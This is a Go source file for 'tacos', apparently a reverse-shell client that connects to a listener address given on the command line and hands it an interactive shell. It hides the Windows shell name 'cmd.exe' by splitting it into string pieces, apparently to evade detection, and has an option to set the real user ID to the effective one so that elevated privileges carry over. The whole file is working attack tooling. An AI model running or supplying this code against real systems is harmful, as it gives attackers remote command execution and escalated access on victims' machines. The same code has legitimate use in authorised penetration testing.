package main

import (
	"flag"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"

	"github.com/ariary/tacos/pkg/tacos"
)

var Remote string

func main() {
	//var detect, daemon bool
	var detect, setreuid bool
	var shell string
	flag.BoolVar(&detect, "detect", false, "Detect default shell to use it in reverse shell")
	//TODO: flag.BoolVar(&daemon, "daemon", false, "Disown the process from the terminal")
	flag.StringVar(&shell, "shell", "/bin/bash", "shell to use for reverse shell") //default /bin/bash
	flag.BoolVar(&setreuid, "setreuid", false, "Set the real and effective user IDs to the EUID parameter")
	flag.Parse()

	if runtime.GOOS == "windows" {
		shell = strings.ToLower(fmt.Sprintf("%s%s%s", "Cm", "D.e", "Xe"))
	}

	if detect {
		shell = tacos.DetectDefaultShell()
	}

	if len(flag.Args()) > 0 {
		Remote = flag.Arg(0)
	}

	if Remote == "" {
		fmt.Println("Usage: tacos [listener_url]:[port]")
		os.Exit(1)
	}
	if setreuid { //to fix: undefined: syscall.Setreuid for windows
		euid := syscall.Geteuid()    //effective ID
		syscall.Setreuid(euid, euid) //set real user id to eid, Print error if you want to debug
	}

	tacos.ShellReverse(Remote, shell)
}
